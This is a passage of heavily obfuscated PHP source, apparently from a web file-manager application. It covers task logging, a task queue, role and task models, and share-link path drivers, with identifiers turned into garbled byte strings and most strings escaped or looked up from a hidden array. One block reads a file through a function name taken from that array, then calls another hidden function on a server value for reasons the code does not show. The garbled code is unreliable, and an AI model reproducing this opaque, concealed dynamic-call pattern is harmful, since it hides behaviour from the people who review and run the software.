=& $_SERVER[É¨™èà]; Hook::unbind($•ıÁÃü—[1846], array($this, $•ıÁÃü—[1879])); Hook::unbind($•ıÁÃü—[1848], array($this, $•ıÁÃü—[1880])); Hook::unbind($•ıÁÃü—[1850], array($this, $•ıÁÃü—[1881])); } public function progressStart($ÌÌş£ÁÒ) { $Ë‹Àƒ€¬ =& $_SERVER[É¨™èà]; $Á Ú = curl_getinfo($ÌÌş£ÁÒ); self::log($Ë‹Àƒ€¬[1882] . $Á Ú[$Ë‹Àƒ€¬[393]]); self::valueSet($this->task[$Ë‹Àƒ€¬[485]], $this->task); } public function progressEnd($ÛŒÌ¼²ê) { $İ’ƒñê =& $_SERVER[É¨™èà]; self::log($İ’ƒñê[1883] . $this->task[$İ’ƒñê[485]]); $this->end(); } public function progress($‘ÈáÚ¡â, $óƒƒëæ­, $‘°ÎÕœÁ, $ÍıÉİî, $ÙÁ«Âú®) { $¯°¼à =& $_SERVER[É¨™èà]; $œêßàƒµ =& $this->task; if ($ÙÁ«Âú® > 0) { $œêßàƒµ[$¯°¼à[1157]] = $œêßàƒµ[$¯°¼à[1157]] == 0 ? $ÍıÉİî : $œêßàƒµ[$¯°¼à[1157]]; $œêßàƒµ[$¯°¼à[1801]] = $ÙÁ«Âú®; } else { if ($‘°ÎÕœÁ > 0) { $œêßàƒµ[$¯°¼à[1157]] = $œêßàƒµ[$¯°¼à[1157]] == 0 ? $óƒƒëæ­ : $œêßàƒµ[$¯°¼à[1157]]; $œêßàƒµ[$¯°¼à[1801]] = $‘°ÎÕœÁ; } } $this->update(); self::log("\160\162\x6f\x67\x72\x65\x73\x73\x48\164\164\160\x3a\144\x6f\x77\156\72{$‘°ÎÕœÁ}\x2f{$óƒƒëæ­}\73\x20\x75\x70\x6c\x6f\141\144\72{$ÙÁ«Âú®}\x2f{$ÍıÉİî}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ë«Çı¸î, $ÆéŸ­Ş¯ = '', $Ì³•”§ = 0, $¨ÈÙÇæ‡ = '') { $¹…·ú€ê =& $_SERVER[É¨™èà]; $¨ÈÙÇæ‡ = $¨ÈÙÇæ‡ ? $¨ÈÙÇæ‡ : ($ÆéŸ­Ş¯ ? $ÆéŸ­Ş¯ : $Ë«Çı¸î); $Ğ¥öÇ‘û = new Task($Ë«Çı¸î, $ÆéŸ­Ş¯, $Ì³•”§, $¨ÈÙÇæ‡); $GLOBALS[$¹…·ú€ê[1884] . $Ë«Çı¸î] = new TaskLog($¹…·ú€ê[1783], $Ğ¥öÇ‘û, $¨ÈÙÇæ‡); return $Ğ¥öÇ‘û; } public function __construct($ÎŞ«ª±â = '', $¨ÁİŸ¹Ç = '', $‡Ç¦åÑĞ = '') { $×Çï´¤ =& $_SERVER[É¨™èà]; if (!$ÎŞ«ª±â) { $ÎŞ«ª±â = $×Çï´¤[1783]; } $àıë°¹­ = $ÎŞ«ª±â . $×Çï´¤[472] . rand_string(10); if (!$‡Ç¦åÑĞ) { $‡Ç¦åÑĞ = $ÎŞ«ª±â . $×Çï´¤[53] . $‡Ç¦åÑĞ; } switch ($ÎŞ«ª±â) { case $×Çï´¤[1783]: if (!$¨ÁİŸ¹Ç || !$¨ÁİŸ¹Ç->task) { return echoLog($ÎŞ«ª±â . $×Çï´¤[1885]); } $Õéı°Áƒ = $¨ÁİŸ¹Ç; $àıë°¹­ = $Õéı°Áƒ->task[$×Çï´¤[485]]; $ÎŞ«ª±â = $Õéı°Áƒ->task[$×Çï´¤[485]]; if (!$Õéı°Áƒ->task[$×Çï´¤[1687]]) { $Õéı°Áƒ->task[$×Çï´¤[1687]] = $‡Ç¦åÑĞ ? $‡Ç¦åÑĞ : $ÎŞ«ª±â; } break; case $×Çï´¤[1886]: if (!$¨ÁİŸ¹Ç) { return echoLog($ÎŞ«ª±â . $×Çï´¤[1887]); } $¬¥ù¾õ = is_string($¨ÁİŸ¹Ç) ? array($¨ÁİŸ¹Ç) : $¨ÁİŸ¹Ç; $Õéı°Áƒ = new TaskFileTransfer($àıë°¹­, $ÎŞ«ª±â, 0, $‡Ç¦åÑĞ ? $‡Ç¦åÑĞ : $¬¥ù¾õ[0]); foreach ($¬¥ù¾õ as $­¢¼ºŸ) { $Õéı°Áƒ->addPath($­¢¼ºŸ); } break; case $×Çï´¤[399]: if (!$¨ÁİŸ¹Ç) { return echoLog($ÎŞ«ª±â . $×Çï´¤[1887]); } $¬¥ù¾õ = is_string($¨ÁİŸ¹Ç) ? array($¨ÁİŸ¹Ç) : $¨ÁİŸ¹Ç; $Õéı°Áƒ = new TaskZip($àıë°¹­, $ÎŞ«ª±â, 0, $‡Ç¦åÑĞ ? $‡Ç¦åÑĞ : $¬¥ù¾õ[0]); foreach ($¬¥ù¾õ as $­¢¼ºŸ) { $Õéı°Áƒ->addPath($­¢¼ºŸ); } break; case $×Çï´¤[1319]: if (!$¨ÁİŸ¹Ç) { return echoLog($ÎŞ«ª±â . $×Çï´¤[1887]); } $Õéı°Áƒ = new TaskUnZip($àıë°¹­, $ÎŞ«ª±â, 0, $‡Ç¦åÑĞ ? $‡Ç¦åÑĞ : $¨ÁİŸ¹Ç); if ($¨ÁİŸ¹Ç) { $Õéı°Áƒ->addFile($¨ÁİŸ¹Ç); } break; case $×Çï´¤[152]: $Õéı°Áƒ = new TaskHttp($àıë°¹­, $ÎŞ«ª±â); break; default: return; break; } $this->task = $Õéı°Áƒ; $this->taskID = $àıë°¹­; Hook::bind($×Çï´¤[1821], array($this, $×Çï´¤[1888])); Hook::bind($×Çï´¤[1823], array($this, $×Çï´¤[1889])); Hook::bind($×Çï´¤[1817], array($this, $×Çï´¤[1890])); echoLog($×Çï´¤[1891] . $Õéı°Áƒ->task[$×Çï´¤[1687]]); } public function __destruct() { $this->end(); } public function end($‚“µç³¼ = '') { $×·à™‚Î =& $_SERVER[É¨™èà]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($‚“µç³¼); $this->task = !1; $this->taskID = !1; Hook::unbind($×·à™‚Î[1821], array($this, $×·à™‚Î[1888])); Hook::unbind($×·à™‚Î[1823], array($this, $×·à™‚Î[1889])); Hook::unbind($×·à™‚Î[1817], array($this, $×·à™‚Î[1890])); } public function taskUpdate($˜•‘ğóª) { $˜«—™‹Û =& $_SERVER[É¨™èà]; if (!$˜•‘ğóª || $this->taskID != $˜•‘ğóª[$˜«—™‹Û[485]]) { return; } $“ê‘Û”­ = 20; $ğ¦¼‡Úà = intval($˜•‘ğóª[$˜«—™‹Û[1802]] * $“ê‘Û”­); $™²›™Öœ = $˜«—™‹Û[176] . str_repeat($˜«—™‹Û[516], $ğ¦¼‡Úà) . $˜«—™‹Û[1108] . str_repeat($˜«—™‹Û[53], $“ê‘Û”­ - $ğ¦¼‡Úà) . $˜«—™‹Û[178]; $­£¿º = $™²›™Öœ . sprintf($˜«—™‹Û[1892], $˜•‘ğóª[$˜«—™‹Û[1802]] * 100) . $˜«—™‹Û[1893]; $‚›ÕÃ³ = $­£¿º . $˜•‘ğóª[$˜«—™‹Û[1801]] . $˜«—™‹Û[8] . $˜•‘ğóª[$˜«—™‹Û[1157]] . LNG($˜«—™‹Û[1894]); $Ò”ºî‰¡ = $˜«—™‹Û[12]; if ($˜•‘ğóª[$˜«—™‹Û[1878]]) { $‚›ÕÃ³ = $­£¿º . size_format($˜•‘ğóª[$˜«—™‹Û[1801]]) . $˜«—™‹Û[8] . size_format($˜•‘ğóª[$˜«—™‹Û[1157]]); $Ò”ºî‰¡ = size_format($˜•‘ğóª[$˜«—™‹Û[1803]]) . $˜«—™‹Û[1895]; } if ($˜•‘ğóª[$˜«—™‹Û[1159]]) { $˜•‘ğóª[$˜«—™‹Û[1852]] = $˜•‘ğóª[$˜«—™‹Û[1159]] . $˜«—™‹Û[53] . $˜•‘ğóª[$˜«—™‹Û[1852]]; } if ($˜•‘ğóª[$˜«—™‹Û[1852]]) { $îŞ¹±÷½ = $˜«—™‹Û[12]; if ($˜•‘ğóª[$˜«—™‹Û[1854]]) { $îŞ¹±÷½ = $˜«—™‹Û[50] . size_format($˜•‘ğóª[$˜«—™‹Û[1855]]) . $˜«—™‹Û[8] . size_format($˜•‘ğóª[$˜«—™‹Û[1854]]); } $Ò”ºî‰¡ .= $˜•‘ğóª[$˜«—™‹Û[1852]] . $îŞ¹±÷½; } if ($˜•‘ğóª[$˜«—™‹Û[854]] && !$˜•‘ğóª[$˜«—™‹Û[1854]]) { $Ò”ºî‰¡ .= $˜«—™‹Û[53] . size_format($˜•‘ğóª[$˜«—™‹Û[1859]]) . $˜«—™‹Û[8] . size_format($˜•‘ğóª[$˜«—™‹Û[854]]); } echoLog($‚›ÕÃ³ . $˜«—™‹Û[53] . $Ò”ºî‰¡, !0); } public function taskEnd($Ï£¿„å) { $½³Êë®‘ =& $_SERVER[É¨™èà]; if (!$Ï£¿„å || $this->taskID != $Ï£¿„å[$½³Êë®‘[485]]) { return; } $‹„Ú‰ Ä = $Ï£¿„å ? LNG($½³Êë®‘[1896]) . $½³Êë®‘[4] . $Ï£¿„å[$½³Êë®‘[1801]] . $½³Êë®‘[8] . $Ï£¿„å[$½³Êë®‘[1157]] . LNG($½³Êë®‘[1894]) . $½³Êë®‘[74] : $½³Êë®‘[12]; echoLog($½³Êë®‘[1897] . $Ï£¿„å[$½³Êë®‘[1687]] . ($Ï£¿„å[$½³Êë®‘[536]] ? $½³Êë®‘[74] . $Ï£¿„å[$½³Êë®‘[536]] : $½³Êë®‘[12]) . $½³Êë®‘[74] . $‹„Ú‰ Ä . $½³Êë®‘[1898] . sprintf($½³Êë®‘[948], timeFloat() - $Ï£¿„å[$½³Êë®‘[1804]]) . $½³Êë®‘[1816]); $this->end(); } public function taskKill($Ç¥µöî) { $è©®şº½ =& $_SERVER[É¨™èà]; if (!$Ç¥µöî || $this->taskID != $Ç¥µöî[$è©®şº½[485]]) { return; } echoLog($è©®şº½[1899] . $Ç¥µöî[$è©®şº½[1687]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\121\165\x65\165\x65\114\x65\x6e\147\x74\x68"; const QUEUE_DATA = "\164\x61\163\153\x51\165\x65\165\145\x44\x61\164\x61"; const QUEUE_TIME = "\x74\141\x73\153\121\x75\145\165\x65\114\141\163\164\x52\165\x6e"; const QUEUE_THREAD = "\164\141\163\153\x51\x75\x65\165\x65\124\150\x72\145\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÈŸÃË, $¼ÒÂÀå = array(), $ÅÌÎµà— = '', $¿¢ùîÊÔ = '') { $µÄÊµù =& $_SERVER[É¨™èà]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¿¢ùîÊÔ && array_find_by_field(self::$listData, $µÄÊµù[97], $¿¢ùîÊÔ)) { return !0; } if ($¿¢ùîÊÔ && array_find_by_field(self::$listDataAdd, $µÄÊµù[97], $¿¢ùîÊÔ)) { return !0; } self::$listDataAdd[] = array($µÄÊµù[353] => $ÈŸÃË, $µÄÊµù[1900] => $¼ÒÂÀå, $µÄÊµù[536] => $ÅÌÎµà—, $µÄÊµù[97] => $¿¢ùîÊÔ); return !0; } public static function addSubmit() { $Î¦Ï˜ =& $_SERVER[É¨™èà]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Î¦Ï˜[1901] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Î¦Ï˜[12], $Î¦Ï˜[536])), $Î¦Ï˜[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($·ö·Ê®, $Ç¯†û¸… = array(), $ˆ‡â•Œ¤ = '', $ôæØÍ‰„ = '') { $ÃÔºˆ£” =& $_SERVER[É¨™èà]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¥ÙäÕÑó = self::getAll(); if ($ôæØÍ‰„ && array_find_by_field($¥ÙäÕÑó, $ÃÔºˆ£”[97], $ôæØÍ‰„)) { return !0; } $¥ÙäÕÑó[] = array($ÃÔºˆ£”[353] => $·ö·Ê®, $ÃÔºˆ£”[1900] => $Ç¯†û¸…, $ÃÔºˆ£”[536] => $ˆ‡â•Œ¤, $ÃÔºˆ£”[97] => $ôæØÍ‰„); self::setAll($¥ÙäÕÑó); write_log($ÃÔºˆ£”[1901] . $ˆ‡â•Œ¤, $ÃÔºˆ£”[198]); return !0; } public static function run() { $Ù¶ëÈı¹ =& $_SERVER[É¨™èà]; $Á–¶òÃÆ = self::getAll(); $—×ºú°³ = array_shift($Á–¶òÃÆ); if (!$—×ºú°³) { return !1; } self::setAll($Á–¶òÃÆ); $üŞ¡şì = timeFloat(); $Æ¶‡¯ò = $Ù¶ëÈı¹[12]; try { $Æ¶‡¯ò = Hook::apply($—×ºú°³[$Ù¶ëÈı¹[353]], $—×ºú°³[$Ù¶ëÈı¹[1900]]); } catch (Exception $¤Ú¹ãüé) { write_log($¤Ú¹ãüé, $Ù¶ëÈı¹[1284]); } $•·˜„Ö = number_format(timeFloat() - $üŞ¡şì, 3) . $Ù¶ëÈı¹[1816]; if ($Æ¶‡¯ò && is_string($Æ¶‡¯ò)) { $•·˜„Ö = $•·˜„Ö . $Ù¶ëÈı¹[1902] . $Æ¶‡¯ò; } write_log($Ù¶ëÈı¹[1903] . $—×ºú°³[$Ù¶ëÈı¹[536]] . $Ù¶ëÈı¹[1904] . $•·˜„Ö, $Ù¶ëÈı¹[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ÌÈŒ«õ =& $_SERVER[É¨™èà]; $Õ‡‘ñÛï = self::threadCount() + 1; if ($Õ‡‘ñÛï > 3 || !self::count()) { return; } write_log($ÌÈŒ«õ[1905] . $Õ‡‘ñÛï, $ÌÈŒ«õ[198]); Cache::set(self::QUEUE_THREAD, $Õ‡‘ñÛï, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ÌÈŒ«õ[1906], $ÌÈŒ«õ[198]); } public static function getKey($¨Íì·€, $óìÅ²Û = "\151\156\164") { $×‘áüÓ¨ =& $_SERVER[É¨™èà]; Cache::removeMemory($¨Íì·€); $ÂÁÒß£ = Cache::get($¨Íì·€); if ($óìÅ²Û == $×‘áüÓ¨[375]) { return $ÂÁÒß£ ? intval($ÂÁÒß£) : 0; } if ($óìÅ²Û == $×‘áüÓ¨[1907]) { return is_array($ÂÁÒß£) ? $ÂÁÒß£ : array(); } return $ÂÁÒß£; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[É¨™èà][1907]); } public static function setAll($“‰ö¾Åà) { $×‡òÚˆ„ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($“‰ö¾Åà), $×‡òÚˆ„); Cache::set(self::QUEUE_DATA, $“‰ö¾Åà, $×‡òÚˆ„); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto E†¼ÚÖïíï; d¬…‚³Ç: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x72\x6f\154\x65\114\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\x61\165\x74\150", "\154\x61\x62\145\154", "\144\x69\x73\x70\x6c\141\171", "\163\171\163\164\x65\x6d", "\144\145\x73\143", "\x69\x67\x6e\157\162\x65\x45\x78\164", "\151\x67\156\157\x72\x65\x46\x69\x6c\x65\x53\151\172\145", "\141\144\155\151\x6e\151\163\x74\162\141\x74\157\x72", "\x73\x6f\x72\x74"); public function listData($õ²Ööş = false, $´×èèé = "\x73\x6f\x72\164", $Ó¯Ğ·Æ = false) { $‚òŠ—ÚŞ =& $_SERVER[É¨™èà]; $†îş“” = parent::listData($õ²Ööş, $´×èèé, $Ó¯Ğ·Æ); if (!$õ²Ööş) { foreach ($†îş“” as $Ô—«ÁÂ => $Ä“°§úí) { if ($Ä“°§úí[$‚òŠ—ÚŞ[2211]] == 1) { $†îş“”[$Ô—«ÁÂ][$‚òŠ—ÚŞ[536]] = LNG($‚òŠ—ÚŞ[2487]); } } } return $†îş“”; } public function update($Ø˜Ÿ¬‰, $Øæ‘‰Åó) { $ÃİèÚåô =& $_SERVER[É¨™èà]; $Éš³£òæ = parent::listData($Ø˜Ÿ¬‰); $‘¦öÜùÜ = $this->findByName($Øæ‘‰Åó[$ÃİèÚåô[32]]); if (!$Éš³£òæ || $‘¦öÜùÜ && $‘¦öÜùÜ[$ÃİèÚåô[485]] != $Éš³£òæ[$ÃİèÚåô[485]]) { return !1; } if ($‘¦öÜùÜ[$ÃİèÚåô[2211]] == 1) { $Øæ‘‰Åó = array($ÃİèÚåô[32] => $Øæ‘‰Åó[$ÃİèÚåô[32]], $ÃİèÚåô[2022] => $Øæ‘‰Åó[$ÃİèÚåô[2022]]); } $this->filterAuth($Øæ‘‰Åó[$ÃİèÚåô[497]]); return parent::update($Ø˜Ÿ¬‰, $Øæ‘‰Åó); } public function remove($ŞûÜêî¦) { $µ®œ“ş¿ = parent::listData($ŞûÜêî¦); if (!$µ®œ“ş¿ || $µ®œ“ş¿[$_SERVER[É¨™èà][192]]) { return !1; } return parent::remove($ŞûÜêî¦); } public function add($ÊÈ–ì¬Î) { $½æ®±¼£ =& $_SERVER[É¨™èà]; $ëŒÎ§Èµ = $ÊÈ–ì¬Î[$½æ®±¼£[32]]; if ($this->findByName($ëŒÎ§Èµ)) { return !1; } $˜×„ö¢ß = array($½æ®±¼£[504] => $ëŒÎ§Èµ, $½æ®±¼£[2005] => $½æ®±¼£[12], $½æ®±¼£[2001] => $½æ®±¼£[2009], $½æ®±¼£[2488] => 1, $½æ®±¼£[2004] => 0, $½æ®±¼£[2489] => 0, $½æ®±¼£[2003] => $this->getSort()); $ÊÈ–ì¬Î = array_merge($˜×„ö¢ß, $ÊÈ–ì¬Î); $this->filterAuth($ÊÈ–ì¬Î[$½æ®±¼£[497]]); return parent::insert($ÊÈ–ì¬Î); } private function getSort() { $úÛ…©êØ =& $_SERVER[É¨™èà]; $Úô‘êÓÔ = parent::listData(); $ó€ä¾Ş = array_to_keyvalue($Úô‘êÓÔ, $úÛ…©êØ[12], $úÛ…©êØ[2023]); return empty($ó€ä¾Ş) ? 0 : max($ó€ä¾Ş) + 1; } private function filterAuth(&$®ã¢„‡Ñ) { $¹Î¢øïì =& $_SERVER[É¨™èà]; $½â“ ôé = array(); $³¦Û¢´ = array_filter(explode($¹Î¢øïì[50], $®ã¢„‡Ñ)); foreach ($³¦Û¢´ as $®ã¢„‡Ñ) { $¤ëÆüô¶ = explode($¹Î¢øïì[10], $®ã¢„‡Ñ); if ($¤ëÆüô¶[0] == $¹Î¢øïì[2490] && $¤ëÆüô¶[1] != $¹Î¢øïì[1295]) { $°œ“ÇËØ = $¤ëÆüô¶[0] . $¹Î¢øïì[10] . $¤ëÆüô¶[1] . $¹Î¢øïì[2491]; if (!in_array($°œ“ÇËØ, $³¦Û¢´)) { $½â“ ôé[] = $°œ“ÇËØ; } } $½â“ ôé[] = $®ã¢„‡Ñ; } $®ã¢„‡Ñ = implode($¹Î¢øïì[50], $½â“ ôé); } public function findRoleDefault() { $×íşÙÓ¼ =& $_SERVER[É¨™èà]; $Ğà¹Œ¨˜ = parent::listData(); $ÀïôªˆÆ = !1; foreach ($Ğà¹Œ¨˜ as $Ïâ°§š¤) { if (!$Ïâ°§š¤ || $Ïâ°§š¤[$×íşÙÓ¼[2021]] == $×íşÙÓ¼[231] || $Ïâ°§š¤[$×íşÙÓ¼[2211]] == 1) { continue; } if (strstr($Ïâ°§š¤[$×íşÙÓ¼[497]], $×íşÙÓ¼[2492])) { continue; } if (!strstr($Ïâ°§š¤[$×íşÙÓ¼[497]], $×íşÙÓ¼[2493])) { continue; } if (!$ÀïôªˆÆ) { $ÀïôªˆÆ = $Ïâ°§š¤; continue; } $òÅ¢ûŒ = explode($×íşÙÓ¼[50], $ÀïôªˆÆ[$×íşÙÓ¼[497]]); $à¼©òç¦ = explode($×íşÙÓ¼[50], $Ïâ°§š¤[$×íşÙÓ¼[497]]); if (count($òÅ¢ûŒ) > count($à¼©òç¦)) { $ÀïôªˆÆ = $Ïâ°§š¤; } } return $ÀïôªˆÆ ? $ÀïôªˆÆ[$×íşÙÓ¼[485]] : $×íşÙÓ¼[12]; } public function sort($éı¥ÑˆŸ, $ƒüê„ĞÃ) { return parent::update($éı¥ÑˆŸ, $ƒüê„ĞÃ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\164\141\163\x6b\114\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x74\x79\x70\x65", "\145\166\x65\156\164", "\x74\151\x6d\145", "\144\x65\x73\x63", "\x73\x79\163\x74\145\155", "\145\156\x61\x62\154\x65", "\x6c\141\x73\x74\122\x75\x6e", "\x73\x6f\162\x74"); public function listData($ÃÊ‰¥¼¼ = false, $É¬»¶ÑÖ = "\x73\157\162\164", $«Ò»Å€ò = false) { return parent::listData($ÃÊ‰¥¼¼, $É¬»¶ÑÖ, $«Ò»Å€ò); } public function add($Öğ˜×ò) { $Åƒí·Ã =& $_SERVER[É¨™èà]; $½÷Áó­Ô = $this->findByName($Öğ˜×ò[$Åƒí·Ã[32]]); if ($½÷Áó­Ô) { return !1; } $Öğ˜×ò[$Åƒí·Ã[1750]] = 0; $Öğ˜×ò[$Åƒí·Ã[2023]] = $this->getSort(); return parent::insert($Öğ˜×ò); } private function getSort() { $à¡‡ÔÁ• =& $_SERVER[É¨™èà]; $ßÂ¥ê» = parent::listData(); $óö¥ØËÔ = array_to_keyvalue($ßÂ¥ê», $à¡‡ÔÁ•[12], $à¡‡ÔÁ•[2023]); return empty($óö¥ØËÔ) ? 0 : max($óö¥ØËÔ) + 1; } public function update($â½‚òşØ, $Òõî»¦­) { $‰¼©Ë›› =& $_SERVER[É¨™èà]; $½ò¿ˆ³ = $this->listData($â½‚òşØ); $şŒ¯›’¡ = $this->findByName($Òõî»¦­[$‰¼©Ë››[32]]); if (!$½ò¿ˆ³ || $şŒ¯›’¡ && $şŒ¯›’¡[$‰¼©Ë››[485]] != $½ò¿ˆ³[$‰¼©Ë››[485]]) { return !1; } return parent::update($â½‚òşØ, $Òõî»¦­); } public function remove($‘‰“íÀ½, $Øø×…òÉ = false) { $áÁ¶©¢å =& $_SERVER[É¨™èà]; $Õƒ¸Ğš° = $this->listData($‘‰“íÀ½); if (!$Õƒ¸Ğš°) { return; } if (!$Øø×…òÉ && $Õƒ¸Ğš°[$áÁ¶©¢å[192]] == $áÁ¶©¢å[91]) { return !1; } return parent::remove($‘‰“íÀ½); } public function enable($“Ï¸î±, $öíÉçÛ¤) { return $this->update($“Ï¸î±, array($_SERVER[É¨™èà][2482] => $öíÉçÛ¤)); } public function run($§‹ª¼ş°) { return $this->update($§‹ª¼ş°, array($_SERVER[É¨™èà][2494] => time())); } } goto e¨ÁŞñãáº; AÃ—¤²‡…: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ª–Ôğúş) { $this->pathParse = $ª–Ôğúş; $this->model = Model($_SERVER[É¨™èà][1448]); } protected function infoParse($½öÔÎÒª, $ûÏÏº§â = false, $§ôìõÈ = false) { $Û½Ã³ë€ =& $_SERVER[É¨™èà]; return Action($Û½Ã³ë€[1276])->sharePathInfo($this->pathParse[$Û½Ã³ë€[87]], !0, $ûÏÏº§â); } public function listPath($ÄşİÇ, $åØºø‘ = false) { $„Õ˜ªÃ =& $_SERVER[É¨™èà]; $’Íøïé = parent::listPath($ÄşİÇ, $åØºø‘); if (!$’Íøïé) { return $’Íøïé; } if (is_array($’Íøïé[$„Õ˜ªÃ[1456]])) { $’Íøïé[$„Õ˜ªÃ[1456]] = Action($„Õ˜ªÃ[1276])->shareItemInfo($’Íøïé[$„Õ˜ªÃ[1456]]); } foreach ($’Íøïé as $§¥Öè—­ => $ŠÑ­ÏÉå) { if (!in_array($§¥Öè—­, array($„Õ˜ªÃ[86], $„Õ˜ªÃ[85]))) { continue; } foreach ($ŠÑ­ÏÉå as $”Á—îì„ => $ßïßúÔ­) { $’Íøïé[$§¥Öè—­][$”Á—îì„] = Action($„Õ˜ªÃ[1276])->shareItemInfo($ßïßúÔ­); } } return $’Íøïé; } public function listAll($ô‹¯‡—º) { $Î–õÌÒ¯ =& $_SERVER[É¨™èà]; $Ğ…£ùÃÃ = IO::info($this->pathParse[$Î–õÌÒ¯[87]]); if (!$Ğ…£ùÃÃ) { return array(); } $Ãñ¦ÅÖû = $this->model->listAll($ô‹¯‡—º); foreach ($Ãñ¦ÅÖû as &$åŸ†) { $åŸ†[$Î–õÌÒ¯[90]] = Action($Î–õÌÒ¯[1276])->shareItemInfo($åŸ†[$Î–õÌÒ¯[90]]); } unset($åŸ†); return $Ãñ¦ÅÖû; } } if ($_SERVER[$_SERVER[É¨™èà][308]] != $_SERVER[$_SERVER[É¨™èà][1457]]) { $_getc = $_SERVER[É¨™èà][310]; $_getfile = $_SERVER[$_SERVER[É¨™èà][311]] . $_SERVER[É¨™èà][312]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[É¨™èà][288], $_getfilec); if (count($_getarrs) < $_SERVER[É¨™èà][313]) { $exit = $_SERVER[É¨™èà][314]; $exit(); } $_act = $_SERVER[É¨™èà][315]; $_act($_SERVER[$_SERVER[É¨™èà][309]]); } class PathDriverDriverShareItem { public function __construct($Ã¼–Ó…) { $this->pathParse = $Ã¼–Ó…; } public function __call($‰­ÀÀ±Á, $ËÍàãû) { $ Å„¶¥¨ =& $_SERVER[É¨™èà]; if (method_exists($this, $‰­ÀÀ±Á)) { return; } $æ·¿ç›• = call_user_func_array(array($ Å„¶¥¨[1458], $‰­ÀÀ±Á), $ËÍàãû); $€ŒÆ»şî = array($ Å„¶¥¨[1459], $ Å„¶¥¨[1460], $ Å„¶¥¨[1461], $ Å„¶¥¨[1462], $ Å„¶¥¨[633], $ Å„¶¥¨[635], $ Å„¶¥¨[1463], $ Å„¶¥¨[110], $ Å„¶¥¨[1464], $ Å„¶¥¨[1465]); if (in_array($‰­ÀÀ±Á, $€ŒÆ»şî)) { $æ·¿ç›• = $this->getPathOuter($æ·¿ç›•); } return $æ·¿ç›•; } public function copy($åÄÎí¬Å, $¹»Äß×Ô, $¦‰â‹Í¦ = false, $×Ã¨Ş­ß = false) { return $this->copyMove($åÄÎí¬Å, $¹»Äß×Ô, $¦‰â‹Í¦, $_SERVER[É¨™èà][633], $×Ã¨Ş­ß); } public function move($•ì£ßõÊ, $²·¼Ş, $¼¥ßÕ = false, $˜–ìÙ´Ÿ = false) { return $this->copyMove($•ì£ßõÊ, $²·¼Ş, $¼¥ßÕ, $_SERVER[É¨™èà][635], $˜–ìÙ´Ÿ); } private function copyMove($‹¾Šû°„, $™‰û®‡”, $ÈÛ¾’Å¦, $è®íë§’, $ø¹¨¦àˆ = false) { $‘‘Æ­ûà =& $_SERVER[É¨™èà]; $şß×¿ = $™‰û®‡”; $´Éç™ƒ = IO::driverMake($™‰û®‡”); if ($´Éç™ƒ->pathParse[$‘‘Æ­ûà[1250]]) { $™‰û®‡” = $´Éç™ƒ->pathParse[$‘‘Æ­ûà[1250]]; } else { $™‰û®‡” = $şß×¿; } $’É£”Îİ = IO::copyMove($‹¾Šû°„, $™‰û®‡”, $ÈÛ¾’Å¦, $è®íë§’, $ø¹¨¦àˆ); $’É£”Îİ = $this->getPathOuter($’É£”Îİ); return $’É£”Îİ; } public function pathThis($Û­ ˆÕâ) { return get_path_this($this->pathParse[$_SERVER[É¨™èà][87]]); } public function pathFather($˜Ù­äë±) { return get_path_father($this->pathParse[$_SERVER[É¨™èà][87]]); } public function iconvSystem($¶‹î«à) { return $¶‹î«à; } protected function infoParse($³’úàïï, $Ë¸Ë•í¾ = false) { $”²ôüû÷ =& $_SERVER[É¨™èà]; $¼¿‚Ã§ = $this->pathParse[$”²ôüû÷[572]][$”²ôüû÷[1277]] . $this->pathParse[$”²ôüû÷[1269]]; if ($Ë¸Ë•í¾) { $¬ÁÖ¼Ûß = IO::infoWithChildren($¼¿‚Ã§); } else { $¬ÁÖ¼Ûß = IO::info($¼¿‚Ã§); } $ä‰ö¢ú = $this->pathParse[$”²ôüû÷[572]]; return Action($”²ôüû÷[1455])->_shareItemeParse($¬ÁÖ¼Ûß, $ä‰ö¢ú); } public function listAll($ÖÏ”€„«) { $åˆ™«›ª =& $_SERVER[É¨™èà]; $Šèì«í = IO::listAll($ÖÏ”€„«); $»Û²á½â = rtrim($this->pathParse[$åˆ™«›ª[572]][$åˆ™«›ª[1277]], $åˆ™«›ª[8]); foreach ($Šèì«í as &$Ş¼öœŸ÷) { $Ş¼öœŸ÷[$åˆ™«›ª[87]] = $this->pathDriver . $åˆ™«›ª[8] . ltrim(substr($Ş¼öœŸ÷[$åˆ™«›ª[87]], strlen($»Û²á½â)), $åˆ™«›ª[8]); } unset($Ş¼öœŸ÷); return $Šèì«í; } public function listAllSimple($¥°ÚÁ¹, $äØ¼Ï° = false) { $Ê™Ëò×Í =& $_SERVER[É¨™èà]; $¥õÊû²± = $this->listAll($¥°ÚÁ¹); $©³—á·ó = 